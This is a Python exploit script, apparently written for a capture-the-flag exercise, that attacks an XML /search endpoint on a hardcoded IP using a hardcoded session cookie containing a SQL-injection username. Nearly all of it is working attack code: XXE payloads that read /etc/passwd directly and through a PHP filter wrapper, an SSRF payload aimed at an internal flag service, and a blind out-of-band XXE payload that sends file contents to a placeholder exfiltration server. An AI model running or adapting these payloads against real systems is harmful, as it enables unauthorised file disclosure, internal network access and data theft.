#!/usr/bin/env python3
"""
CTF Web Exploitation - POST /search with XML
"""

import requests
import sys

# Target configuration
HOST = "157.10.160.65"
PORT = 8088
BASE_URL = f"http://{HOST}:{PORT}"

# Session cookie from the request
SESSION_COOKIE = "eyJsb2dnZWRfaW4iOnRydWUsInVzZXIiOiInIE9SIDE9MSAtLSJ9.aRhQtA.Swo36Nhv3leVGEAXoFCxM0u3tPA"

def send_search_request(xml_body, session_cookie=None):
    """
    Send POST request to /search endpoint with XML body
    """
    url = f"{BASE_URL}/search"
    
    headers = {
        "Host": f"{HOST}:{PORT}",
        "Content-Length": str(len(xml_body.encode('utf-8'))),
        "Accept-Language": "en-US,en;q=0.9",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
        "Content-Type": "application/xml",
        "Accept": "*/*",
        "Origin": BASE_URL,
        "Referer": f"{BASE_URL}/dashboard",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }
    
    cookies = {}
    if session_cookie:
        cookies["session"] = session_cookie
    
    try:
        response = requests.post(
            url,
            data=xml_body,
            headers=headers,
            cookies=cookies,
            timeout=10
        )
        
        return response
    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")
        return None

def basic_xml_search(term="TES"):
    """
    Basic XML search request
    """
    xml_body = f"""<!DOCTYPE search [ ]>
<search>
  <term>{term}</term>
</search>"""
    
    print(f"[*] Sending basic search request with term: {term}")
    response = send_search_request(xml_body, SESSION_COOKIE)
    
    if response:
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Response Headers: {dict(response.headers)}")
        print(f"[+] Response Body:\n{response.text}")
        return response
    return None

def xxe_attack():
    """
    XXE (XML External Entity) attack attempt
    """
    print("\n[*] Attempting XXE attack...")
    
    # XXE payload to read /etc/passwd
    xxe_xml = """<!DOCTYPE search [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<search>
  <term>&xxe;</term>
</search>"""
    
    response = send_search_request(xxe_xml, SESSION_COOKIE)
    
    if response:
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Response:\n{response.text}")
        return response
    return None

def xxe_php_wrapper():
    """
    XXE with PHP wrapper to read files
    """
    print("\n[*] Attempting XXE with PHP wrapper...")
    
    xxe_xml = """<!DOCTYPE search [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<search>
  <term>&xxe;</term>
</search>"""
    
    response = send_search_request(xxe_xml, SESSION_COOKIE)
    
    if response:
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Response:\n{response.text}")
        return response
    return None

def xxe_ssrf():
    """
    XXE SSRF attack to access internal services
    """
    print("\n[*] Attempting XXE SSRF...")
    
    xxe_xml = """<!DOCTYPE search [
  <!ENTITY xxe SYSTEM "http://localhost:8080/flag">
]>
<search>
  <term>&xxe;</term>
</search>"""
    
    response = send_search_request(xxe_xml, SESSION_COOKIE)
    
    if response:
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Response:\n{response.text}")
        return response
    return None

def xxe_blind_out_of_band():
    """
    Blind XXE with out-of-band data exfiltration
    """
    print("\n[*] Attempting Blind XXE OOB...")
    
    # Replace with your server
    exfil_server = "your-server.com"
    
    xxe_xml = f"""<!DOCTYPE search [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{exfil_server}/?data=%file;'>">
  %eval;
  %exfil;
]>
<search>
  <term>test</term>
</search>"""
    
    response = send_search_request(xxe_xml, SESSION_COOKIE)
    
    if response:
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Response:\n{response.text}")
        return response
    return None

def custom_xml_payload(custom_term):
    """
    Send custom XML payload
    """
    xml_body = f"""<!DOCTYPE search [ ]>
<search>
  <term>{custom_term}</term>
</search>"""
    
    print(f"[*] Sending custom payload: {custom_term}")
    response = send_search_request(xml_body, SESSION_COOKIE)
    
    if response:
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Response:\n{response.text}")
        return response
    return None

if __name__ == "__main__":
    print("=" * 70)
    print("CTF Web Exploitation - POST /search XML Exploit")
    print("=" * 70)
    print()
    
    # Test basic request first
    basic_xml_search("TES")
    
    # Try XXE attacks
    if len(sys.argv) > 1:
        attack_type = sys.argv[1]
        
        if attack_type == "xxe":
            xxe_attack()
        elif attack_type == "xxe-php":
            xxe_php_wrapper()
        elif attack_type == "xxe-ssrf":
            xxe_ssrf()
        elif attack_type == "xxe-oob":
            xxe_blind_out_of_band()
        elif attack_type == "custom":
            if len(sys.argv) > 2:
                custom_xml_payload(sys.argv[2])
            else:
                print("[-] Usage: python exploit_search.py custom '<payload>'")
        else:
            print(f"[-] Unknown attack type: {attack_type}")
            print("[*] Available: xxe, xxe-php, xxe-ssrf, xxe-oob, custom")
    else:
        print("\n[*] Usage examples:")
        print("  python exploit_search.py xxe          # Basic XXE")
        print("  python exploit_search.py xxe-php       # XXE with PHP wrapper")
        print("  python exploit_search.py xxe-ssrf      # XXE SSRF")
        print("  python exploit_search.py xxe-oob       # Blind XXE OOB")
        print("  python exploit_search.py custom '<payload>'  # Custom XML payload")


